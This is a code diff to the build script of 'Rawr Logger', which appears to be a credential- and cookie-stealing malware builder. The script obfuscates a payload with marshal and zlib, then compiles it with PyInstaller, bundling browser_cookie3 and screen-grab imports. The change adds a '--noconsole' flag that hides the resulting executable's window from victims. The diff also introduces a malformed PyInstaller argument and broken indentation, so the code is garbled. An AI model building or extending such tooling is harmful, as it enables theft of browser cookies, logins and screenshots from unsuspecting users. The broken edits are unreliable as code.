@@ -40,22 +40,21 @@ if prot == 'y':
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
-      os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3" {name}.py')
-      shutil.rmtree('build')
-      os.remove(f'{name}.spec')
-      Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
-      time.sleep(2)
-      Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
-      time.sleep(3)
-      exit()
+     os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab"  --hidden-from pystyle import="*" --hidden-import="browser_cookie3" {name}.py')
+     shutil.rmtree('build')
+     os.remove(f'{name}.spec')
+     Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
+     time.sleep(2)
+     Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
+     time.sleep(3)
+     exit()
     elif compile == "n":
       Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
       time.sleep(3)
       exit()
 
-
-elif prot == 'n':
-    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
+    elif prot == 'n':
+        compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
       os.system(f"pyinstaller --onefile {name}.py")
       shutil.rmtree('build')
@@ -66,5 +65,5 @@ elif prot == 'n':
       time.sleep(3)
       exit()
     elif compile == "n":
-      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
-      time.sleep(3)
+        Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
+        time.sleep(3)
